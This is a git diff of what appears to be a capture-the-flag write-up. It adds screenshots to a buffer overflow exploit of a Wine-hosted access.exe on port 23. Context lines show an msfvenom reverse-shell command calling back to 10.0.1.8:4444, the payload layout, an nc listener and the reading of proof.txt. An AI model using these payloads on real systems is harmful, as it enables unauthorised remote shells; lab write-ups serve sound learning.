@@ -161,9 +161,21 @@ e4ed...[REDACTED]...9fd5
 
 Identified a PE32 (Windows 32-bit) binary run by Wine 4.0 as root, exposed on port 23.
 
+The two binaries were copied locally for analysis:
+
+![Local copies of access.exe and funcs_access.dll](assets/School_1/image-02.png)
+
+I first ran the service under Wine with the debugger:
+
+![Launching access.exe under Wine for debugging](assets/School_1/image-03.png)
+
+![access.exe service running under Wine](assets/School_1/image-04.png)
+
 ```bash
 r2 -A ~/access.exe
 ```
+
+![radare2 static analysis of access.exe](assets/School_1/image-05.png)
 
 | Property               | Value                            |
 |------------------------|----------------------------------|
@@ -213,6 +225,8 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.1.8 LPORT=4444 \
   -e x86/call4_dword_xor EXITFUNC=thread
 ```
 
+![Generating the Windows reverse-shell shellcode with msfvenom](assets/School_1/image-01.png)
+
 ### 6.5 Final payload
 
 ```python
@@ -223,6 +237,8 @@ nop_sled = b"\x90" * 32
 payload = prefix + padding + jmp_esp + nop_sled + shellcode
 ```
 
+![Final BOF payload sent to port 23](assets/School_1/image-07.png)
+
 ### 6.6 Result
 
 The corrected Windows shellcode called back on port 4444 and returned a shell under Wine:
@@ -231,13 +247,23 @@ The corrected Windows shellcode called back on port 4444 and returned a shell un
 sudo nc -lvnp 4444
 # connect to [10.0.1.8] from (UNKNOWN) [10.0.0.31] 36008
 # Microsoft Windows 6.1.7601 (4.0)
+```
 
+![Windows reverse shell showing the target filesystem](assets/School_1/image-06.png)
+
+```cmd
 Z:\>dir root
 # proof.txt
+```
 
+![Windows reverse shell and root directory listing](assets/School_1/image-08.png)
+
+```cmd
 Z:\>more Z:\root\proof.txt
 ccc3...[REDACTED]...d2ae
 ```
+
+![Reading proof.txt from the Wine shell](assets/School_1/image-09.png)
 
 > **PROOF.TXT — 4 PTS** → flag obtained ✓
 
